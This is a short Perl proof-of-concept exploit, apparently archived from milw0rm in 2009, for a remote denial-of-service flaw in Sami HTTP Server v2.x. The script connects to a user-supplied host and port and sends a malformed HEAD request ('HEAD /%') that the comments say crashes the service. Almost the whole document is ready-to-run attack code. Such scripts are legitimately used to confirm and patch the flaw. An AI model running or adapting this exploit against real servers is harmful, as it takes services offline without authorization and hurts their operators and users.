#!/usr/bin/perl
#
# Sami HTTP Server v2.x Remote Denial of Service with (HEAD) request.
#
# --------------------------------------------------------------------
# The vulnerability is caused due to an error in handling the HEAD
# command. This can be exploited to crash the HTTP service.
# --------------------------------------------------------------------
#
# Author: Jonathan Salwan
# Mail: submit [AT] shell-storm.org
# Web: http://www.shell-storm.org


use IO::Socket;
print "[+] Author : Jonathan Salwan\n";
print "[+] Soft   : Sami HTTP Server v2.x Remote DoS\n";

	if (@ARGV < 1)
		{
 		print "[-] Usage: <file.pl> <host> <port>\n";
 		print "[-] Exemple: file.pl 127.0.0.1 80\n";
 		exit;
		}


	$ip 	= $ARGV[0];
	$port 	= $ARGV[1];

print "[+] Sending request...\n";

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "[-]Connexion FAILED!\n";

	print $socket "HEAD /\x25 HTTP/1.0\r\n";

close($socket);

print "[+]Done!\n";

# milw0rm.com [2009-03-30]
